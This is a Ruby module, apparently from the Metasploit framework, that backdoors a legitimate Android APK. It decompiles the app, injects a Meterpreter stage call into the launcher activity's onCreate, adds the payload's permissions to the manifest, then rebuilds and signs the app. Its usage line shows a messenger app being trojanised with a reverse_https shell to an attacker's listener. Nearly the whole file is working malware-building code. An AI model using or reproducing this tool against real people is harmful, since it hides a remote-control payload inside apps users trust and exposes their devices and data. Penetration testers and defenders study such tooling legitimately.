# -*- coding: binary -*-

require 'msf/core'
require 'rex/text'
require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'

module Msf::Payload::Apk

  class ApkBackdoor
    include Msf::Payload::Apk
    def backdoor_apk(apk, payload)
      backdoor_payload(apk, payload)
    end
  end

  def print_status(msg='')
    $stderr.puts "[*] #{msg}"
  end

  def print_error(msg='')
    $stderr.puts "[-] #{msg}"
  end

  def usage
    print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n"
    print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end

  def run_cmd(cmd)
    begin
      stdin, stdout, stderr = Open3.popen3(cmd)
      return stdout.read + stderr.read
    rescue Errno::ENOENT
      return nil
    end
  end

  # Find the activity that is opened when you click the app icon
  def find_launcher_activity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities
      activityname = activity.attribute("targetActivity")
      unless activityname
        activityname = activity.attribute("name")
      end
      category = activity.search('category')
      unless category
        next
      end
      for cat in category
        categoryname = cat.attribute('name')
        if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
          name = activityname.to_s
          if name.start_with?('.')
            name = package + name
          end
          return name
        end
      end
    end
  end

  def fix_manifest(tempdir)
    payload_permissions=[]

    #Load payload's permissions
    File.open("#{tempdir}/payload/AndroidManifest.xml","rb"){|file|
      k=File.read(file)
      payload_manifest=Nokogiri::XML(k)
      permissions = payload_manifest.xpath("//manifest/uses-permission")
      for permission in permissions
        name=permission.attribute("name")
        payload_permissions << name.to_s
      end
    }

    original_permissions=[]
    apk_mani=""

    #Load original apk's permissions
    File.open("#{tempdir}/original/AndroidManifest.xml","rb"){|file2|
      k=File.read(file2)
      apk_mani=k
      original_manifest=Nokogiri::XML(k)
      permissions = original_manifest.xpath("//manifest/uses-permission")
      for permission in permissions
        name=permission.attribute("name")
        original_permissions << name.to_s
      end
    }

    #Get permissions that are not in original APK
    add_permissions=[]
    for permission in payload_permissions
      if !(original_permissions.include? permission)
        print_status("Adding #{permission}")
        add_permissions << permission
      end
    end

    inject=0
    new_mani=""
    #Inject permissions in original APK's manifest
    for line in apk_mani.split("\n")
      if (line.include? "uses-permission" and inject==0)
        for permission in add_permissions
          new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
        end
        new_mani << line+"\n"
        inject=1
      else
        new_mani << line+"\n"
      end
    end
    File.open("#{tempdir}/original/AndroidManifest.xml", "wb") {|file| file.puts new_mani }
  end

  def backdoor_payload(apkfile, raw_payload)
    unless apkfile && File.readable?(apkfile)
      usage
      raise RuntimeError, "Invalid template: #{apkfile}"
    end

    jarsigner = run_cmd("jarsigner")
    unless jarsigner != nil
      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
    end

    apktool = run_cmd("apktool -version")
    unless apktool != nil
      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
    end

    apk_v = Gem::Version.new(apktool)
    unless apk_v >= Gem::Version.new('2.0.1')
      raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
    end

    #Create temporary directory where work will be done
    tempdir = Dir.mktmpdir

    File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
    FileUtils.cp apkfile, "#{tempdir}/original.apk"

    print_status "Decompiling original APK..\n"
    run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
    print_status "Decompiling payload APK..\n"
    run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")

    f = File.open("#{tempdir}/original/AndroidManifest.xml")
    amanifest = Nokogiri::XML(f)
    f.close

    print_status "Locating hook point..\n"
    launcheractivity = find_launcher_activity(amanifest)
    unless launcheractivity
      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
    end
    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
    smalifiles = Dir.glob(smalifile)
    for smalifile in smalifiles
      if File.readable?(smalifile)
        activitysmali = File.read(smalifile)
      end
    end

    unless activitysmali
      raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
    end

    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
    unless activitysmali.include? entrypoint
      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
    end

    print_status "Copying payload files..\n"
    FileUtils.mkdir_p("#{tempdir}/original/smali/com/metasploit/stage/")
    FileUtils.cp Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/Payload*.smali"), "#{tempdir}/original/smali/com/metasploit/stage/"

    payloadhook = entrypoint + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)

    print_status "Loading #{smalifile} and injecting payload..\n"
    File.open(smalifile, "wb") {|file| file.puts hookedsmali }
    injected_apk = "#{tempdir}/output.apk"
    print_status "Poisoning the manifest with meterpreter permissions..\n"
    fix_manifest(tempdir)

    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
    run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
    print_status "Signing #{injected_apk}\n"
    run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")

    outputapk = File.read(injected_apk)

    FileUtils.remove_entry tempdir
    outputapk
  end
end


